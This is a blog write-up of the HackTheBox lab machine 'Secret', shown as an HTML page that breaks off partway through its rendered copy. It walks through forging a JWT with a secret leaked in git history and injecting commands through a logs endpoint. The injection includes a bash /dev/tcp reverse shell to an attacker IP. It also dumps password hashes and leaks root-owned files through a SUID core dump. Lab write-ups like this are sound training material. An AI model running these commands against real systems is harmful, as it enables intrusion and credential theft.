<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Secret | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="Simple machine to learn about *JWT* signing and root privileged core dumps to read file contents."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_secret/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_secret/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Secret"/><meta property="og:description" content="Simple machine to learn about *JWT* signing and root privileged core dumps to read file contents."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_secret/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_n9Ub2ec.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-11-16T18:06:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:17:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_n9Ub2ec.png"/><meta name="twitter:title" content="HackTheBox Writeup: Secret"/><meta name="twitter:description" content="Simple machine to learn about *JWT* signing and root privileged core dumps to read file contents."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Secret","item":"https://xzebra.dev/blog/hackthebox_writeup_secret/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Secret","name":"HackTheBox Writeup: Secret","description":"Simple machine to learn about *JWT* signing and root privileged core dumps to read file contents.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration nmap -sC -sS -sV -F 10.10.11.120 \u003escan.txt Starting Nmap 7.92 ( ) at 2021-11-16 11:45 EET Nmap scan report for 10.10.11.120 Host is up (0.067s latency). Not shown: 97 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at . Nmap done: 1 IP address (1 host up) scanned in 15.18 seconds The service at port 80 and 3000 seems the same when you visit them through the browser. It seems to be an authentication service API based on Json Web Tokens (JWT).\nWe can register a new user with the following request:\ncurl -X POST \\\\ -H 'Content-Type: application/json' \\\\ -d '{\"name\": \"xzebra\",\"email\":\"zebra@example.com\",\"password\":\"zebra1234\"}' {\"user\": \"xzebra\"} Then login with the following:\ncurl -X POST \\\\ -H 'Content-Type: application/json' \\\\ -d '{\"email\":\"zebra@example.com\",\"password\":\"zebra1234\"}' And we get the token as response.\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzODBjOTkzODI3ODA0NTc1NjEzMDQiLCJuYW1lIjoieHplYnJhIiwiZW1haWwiOiJ6ZWJyYUBleGFtcGxlLmNvbSIsImlhdCI6MTYzNzA1Njc1NX0.u_5Ez2Ng6UkFTMMsOZNYQSK6_DsKl-dP95Z9J3sKVWk If we add the given token to the curl headers, we can now access the /api/priv endpoint.\ncurl -X GET \\\\ -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzODBjOTkzODI3ODA0NTc1NjEzMDQiLCJuYW1lIjoieHplYnJhIiwiZW1haWwiOiJ6ZWJyYUBleGFtcGxlLmNvbSIsImlhdCI6MTYzNzA1Njc1NX0.u_5Ez2Ng6UkFTMMsOZNYQSK6_DsKl-dP95Z9J3sKVWk' But we donâ€™t have any permissions.\n{\"role\":{\"role\":\"you are normal user\",\"desc\":\"xzebra\"}} Getting the foothold At the end of the page there is a download button. It is a git repository, if we see the logs, we can see an .env file kept secret. We can recover the file returning to given commit.\ngit checkout de0a46b5107a2f4d26e348303e76d85ae4870934 If we look at the content of .env file, we can see the following.\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE In routes/private.js we see the following when getting /api/priv.\nif (name == 'theadmin'){ res.json({ creds:{ role:\"admin\", username:\"theadmin\", desc : \"welcome back admin,\" } }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) } It is a hardcoded login that checks wether the JWT contains the name theadmin. JWT sometimes contain some session data. In this case, by reading routes/verifytoken.js we can confirm the user is contained in it:\nconst jwt = require(\"jsonwebtoken\"); module.exports = function (req, res, next) { const token = req.header(\"auth-token\"); if (!token) return res.status(401).send(\"Access Denied\"); try { const verified = jwt.verify(token, process.env.TOKEN_SECRET); req.user = verified; next(); } catch (err) { res.status(400).send(\"Invalid Token\"); } }; We can decrypt the JWT with some online application like https://jwt.io/. In case of my token, I can see the following:\n{ \"_id\": \"6193c72308a29d0462527318\", \"name\": \"xzebra\", \"email\": \"zebra@example.com\", \"iat\": 1637074738 } We can change the name field to match theadmin, then encrypt and sign again using the token we got from the .env file and use it to GET /api/priv. We get the following response:\n{\"creds\":{\"role\":\"admin\",\"username\":\"theadmin\",\"desc\":\"welcome back admin\"}}% This means we now have a JWT with admin rights (or at least how it is programmed haha).\nGetting the user flag After exploring a bit more the code, we can see there is a route /api/logs, which executes an unescaped git command.\nrouter.get('/logs', verifytoken, (req, res) =\u003e { const file = req.query.file; const userinfo = { name: req.user } const name = userinfo.name.name; if (name == 'theadmin'){ const getLogs = `git log --oneline ${file}`; This means we can do a command injection using the file query parameter.\nIn order to try this, we can try to print test to see if it executes.\ncurl -G \\\\ -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzYzcyMzA4YTI5ZDA0NjI1MjczMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InplYnJhQGV4YW1wbGUuY29tIiwiaWF0IjoxNjM3MDc0NzM4fQ.wGnnkVqhdAph5nRRdqnqbCbHV7jx_eMwh5IgvDSYMTw' \\\\ --data-urlencode \"file=;echo test\" \"80bf34c fixed typos ðŸŽ‰\\\\n0c75212 now we can view logs from server ðŸ˜ƒ\\\\nab3e953 Added the codes\\\\ntest\\\\n\" We get the test message appended to the end. So now we can try to execute a reverse shell.\ncurl -G \\\\ -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzYzcyMzA4YTI5ZDA0NjI1MjczMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InplYnJhQGV4YW1wbGUuY29tIiwiaWF0IjoxNjM3MDc0NzM4fQ.wGnnkVqhdAph5nRRdqnqbCbHV7jx_eMwh5IgvDSYMTw' \\\\ --data-urlencode \"file=;/usr/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.100/6666 0\u003e\u00261'\" And we got into dasith user!\nJust for convenience, we can generate a ssh key with ssh-keygen and upload it to ~/.ssh/authorized-keys. And then ssh into the machine with:\nssh -i key_rsa dasith@10.10.11.120 This will give us a more useful shell.\nPrivilege escalation We saw some mongodb path in the .env file, we can try to get some credentials from there.\nmongo mongodb://127.0.0.1:27017/auth-web Once connected, we can list the collections with:\n\u003e show collections users There is a users collection, lets get the content:\n\u003e db.users.find() { \"_id\" : ObjectId(\"6131bf09c6c27d0b05c16691\"), \"name\" : \"theadmin\", \"email\" : \"admin@admins.com\", \"password\" : \"$2a$10$SJ8vlQEJYL2J673Xte6BNeMmhHBioLSn6/wqMz2DKjxwQzkModUei\", \"date\" : ISODate(\"2021-09-03T06:22:01.581Z\"), \"__v\" : 0 } { \"_id\" : ObjectId(\"6131d73387dee30378c66556\"), \"name\" : \"newuser\", \"email\" : \"root@dasith.works\", \"password\" : \"$2a$10$wnvh2al2ABafCszb9oWi/.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW\", \"date\" : ISODate(\"2021-09-03T08:05:07.991Z\"), \"__v\" : 0 } { \"_id\" : ObjectId(\"613904ae8a27cb040c65de17\"), \"name\" : \"dasith\", \"email\" : \"dasiths2v2@gmail.com\", \"password\" : \"$2a$10$S/GbYplKgIU4oFdTDsr2SeOJreht3UgIA0MdT7F50EtiBy7ymzFBO\", \"date\" : ISODate(\"2021-09-08T18:45:02.187Z\"), \"__v\" : 0 } I tried decrypting adminâ€™s hash with hashcat resulting in a very long wait without any success. Meanwile, I tried other privilege escalation techniques, such as looking for sudo allowed commands with sudo -l, but got no success. Although, if we look for files with the setuid bit flag set:\nfind / -type f -perm -u=s 2\u003e/dev/null We get an interesting one: /opt/count. Also, the source code is in the same folder, in /opt/code.c.\nThe executable is owned by root and has the suid bit set, which means it will run with root privileges until this line:\n// drop privs to limit file write setuid(getuid()); This means all the file and directory reads are performed by root. Although, no writes can be performed by root (unless executed by root).\nThe important part here is the PR_SET_DUMPABLE attribute. According to the man pages:\nPR_SET_DUMPABLE (since Linux 2.3.20) Set the state of the \"dumpable\" attribute, which determines whether core dumps are produced for the calling process upon delivery of a signal whose default behavior is to produce a core dump. This means if we send a signal that creates a core dump to the process while running, a core dump file will be generated. In this core dump we could see the results of reading some files with privileged access stored in the file buffer, which will be dumped.\nNormally crashes are found in /var/crash, but may also be in /var/spool or /var/lib/systemd/coredump on other Linux distributions â€“ linux-audit.com\nWe can try this by running the count program from one shell and killing it from another. We donâ€™t have to enter a path, or the executable will try to dump the file without permissions.\ndasith@secret:/opt$ ./count Enter source file/directory name: /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: y Path: Then kill the process with a signal that generates a core dump.\ndasith@secret:/opt$ ps -aux | grep count root 854 0.0 0.1 235668 7528 ? Ssl 15:16 0:00 /usr/lib/accountsservice/accounts-daemon dasith 40559 0.0 0.0 2488 588 pts/0 S+ 16:25 0:00 ./count dasith 40699 0.0 0.0 6432 660 pts/6 S+ 16:26 0:00 grep --color=auto count dasith@secret:/opt$ kill -BUS 40559 We can see in the executable shell that the core was dumped. Letâ€™s now look for the crash report file.\ndasith@secret:/var/crash$ ls -la total 88 drwxrwxrwt 2 root root 4096 Nov 16 15:22 . drwxr-xr-x 14 root root 4096 Aug 13 05:12 .. -rw-r----- 1 root root 27203 Oct 6 18:01 _opt_count.0.crash -rw-r----- 1 dasith dasith 28107 Nov 16 16:26 _opt_count.1000.crash -rw-r----- 1 root root 24048 Oct 5 14:24 _opt_countzz.0.crash We will unpack the most recent one (also the created by the user):\ndasith@secret:/var/crash$ mkdir /tmp/count-crash dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/count-crash/ We can cat the CoreDump file inside the created folder and find the flag. But as it is a binary file, it will be easier to use the strings command:\ndasith@secret:/tmp/count-crash$ strings CoreDump This is not a full system own, so we are going to try to read ssh keys. We can list the .ssh folder files, and we can see there is a id_rsa key.\ndasith@secret:/tmp/count-crash$ /opt/count Enter source file/directory name: /root/.ssh drwx------ .. -rw------- authorized_keys -rw------- id_rsa drwx------ . -rw-r--r-- id_rsa.pub After exploiting the crash vulnerability, we are able to retrieve the content of the id_rsa key. And we can ssh into root to compromise the whole system.\nReferences How to read the core dumps: How does one get a hold of the details regarding a system/application crash Is there a way to generate a decent looking report with the /var/share/apport/*.crash files? If not, how does one get a hold of the details regarding a past system error? https://askubuntu.com/questions/304943/how-does-one-get-a-hold-of-the-details-regarding-a-system-application-crash prctl function and PR_SET_DUMPABLE: prctl(2) - Linux manual page https://man7.org/linux/man-pages/man2/prctl.2.html#:~:text=by%20(int%20*)%20arg2.-,PR_SET_DUMPABLE,-(since%20Linux%202.3.20) ","wordCount":"1409","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_n9Ub2ec.png","datePublished":"2021-11-16T18:06:00+07:00","dateModified":"2023-05-13T11:17:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_secret/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Secret</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">Simple machine to learn about <em>JWT</em> signing and root privileged core dumps to read file contents.</div><div class="post-meta"><span title="2021-11-16 18:06:00 +0700 +0700">November 16, 2021</span>Â Â·Â 7 minÂ Â·Â Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_n9Ub2ec.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>nmap -sC -sS -sV -F 10.10.11.120 &gt;scan.txt
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> &lt;https://nmap.org&gt; <span style="color:#f92672">)</span> at 2021-11-16 11:45 EET
</span></span><span style="display:flex"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.120
</span></span><span style="display:flex"><span>Host is up <span style="color:#f92672">(</span>0.067s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>Not shown: <span style="color:#ae81ff">97</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_  <span style="color:#ae81ff">256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>80/tcp   open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_http-title: DUMB Docs
</span></span><span style="display:flex"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>3000/tcp open  http    Node.js <span style="color:#f92672">(</span>Express middleware<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_http-title: DUMB Docs
</span></span><span style="display:flex"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
</span></span><span style="display:flex"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.18 seconds
</span></span></code></pre></div><p>The service at port 80 and 3000 seems the same when you visit them through the
browser. It seems to be an authentication service API based on <em>Json Web Tokens</em>
(JWT).</p><p>We can register a new user with the following request:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -X POST &lt;http://10.10.11.120/api/user/register&gt; <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>-H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>-d <span style="color:#e6db74">&#39;{&#34;name&#34;: &#34;xzebra&#34;,&#34;email&#34;:&#34;zebra@example.com&#34;,&#34;password&#34;:&#34;zebra1234&#34;}&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{<span style="color:#f92672">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;xzebra&#34;</span>}
</span></span></code></pre></div><p>Then login with the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -X POST &lt;http://10.10.11.120/api/user/login&gt; <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>-H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>-d <span style="color:#e6db74">&#39;{&#34;email&#34;:&#34;zebra@example.com&#34;,&#34;password&#34;:&#34;zebra1234&#34;}&#39;</span>
</span></span></code></pre></div><p>And we get the token as response.</p><pre tabindex="0"><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzODBjOTkzODI3ODA0NTc1NjEzMDQiLCJuYW1lIjoieHplYnJhIiwiZW1haWwiOiJ6ZWJyYUBleGFtcGxlLmNvbSIsImlhdCI6MTYzNzA1Njc1NX0.u_5Ez2Ng6UkFTMMsOZNYQSK6_DsKl-dP95Z9J3sKVWk
</code></pre><p>If we add the given token to the curl headers, we can now access the <code>/api/priv</code> endpoint.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -X GET &lt;http://10.10.11.120/api/priv&gt; <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>-H <span style="color:#e6db74">&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzODBjOTkzODI3ODA0NTc1NjEzMDQiLCJuYW1lIjoieHplYnJhIiwiZW1haWwiOiJ6ZWJyYUBleGFtcGxlLmNvbSIsImlhdCI6MTYzNzA1Njc1NX0.u_5Ez2Ng6UkFTMMsOZNYQSK6_DsKl-dP95Z9J3sKVWk&#39;</span>
</span></span></code></pre></div><p>But we donâ€™t have any permissions.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{<span style="color:#f92672">&#34;role&#34;</span>:{<span style="color:#f92672">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;you are normal user&#34;</span>,<span style="color:#f92672">&#34;desc&#34;</span>:<span style="color:#e6db74">&#34;xzebra&#34;</span>}}
</span></span></code></pre></div><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>At the end of the page there is a download button. It is a git repository, if
we see the logs, we can see an <code>.env</code> file kept secret. We can recover the file
returning to given commit.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>git checkout de0a46b5107a2f4d26e348303e76d85ae4870934
</span></span></code></pre></div><p>If we look at the content of <code>.env</code> file, we can see the following.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>DB_CONNECT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
</span></span><span style="display:flex"><span>TOKEN_SECRET <span style="color:#f92672">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
</span></span></code></pre></div><p>In <code>routes/private.js</code> we see the following when getting <code>/api/priv</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;theadmin&#39;</span>){
</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
</span></span><span style="display:flex"><span>        <span style="color:#a6e22e">creds</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex"><span>            <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;theadmin&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#a6e22e">desc</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;welcome back admin,&#34;</span>
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    })
</span></span><span style="display:flex"><span>}
</span></span><span style="display:flex"><span><span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
</span></span><span style="display:flex"><span>        <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex"><span>            <span style="color:#a6e22e">role</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;you are normal user&#34;</span>,
</span></span><span style="display:flex"><span>            <span style="color:#a6e22e">desc</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">name</span>
</span></span><span style="display:flex"><span>        }
</span></span><span style="display:flex"><span>    })
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>It is a hardcoded login that checks wether the <em>JWT</em> contains the name <code>theadmin</code>.
<em>JWT</em> sometimes contain some session data. In this case, by reading
<code>routes/verifytoken.js</code> we can confirm the user is contained in it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jwt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;jsonwebtoken&#34;</span>);
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;auth-token&#34;</span>);
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">token</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Access Denied&#34;</span>);
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">verified</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">verify</span>(<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">TOKEN_SECRET</span>);
</span></span><span style="display:flex"><span>        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">verified</span>;
</span></span><span style="display:flex"><span>        <span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Invalid Token&#34;</span>);
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>};
</span></span></code></pre></div><p>We can decrypt the <em>JWT</em> with some online application like <a href="https://jwt.io/">https://jwt.io/</a>.
In case of my token, I can see the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span>{
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;_id&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;6193c72308a29d0462527318&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;xzebra&#34;</span>,
</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;email&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;zebra@example.com&#34;</span>,
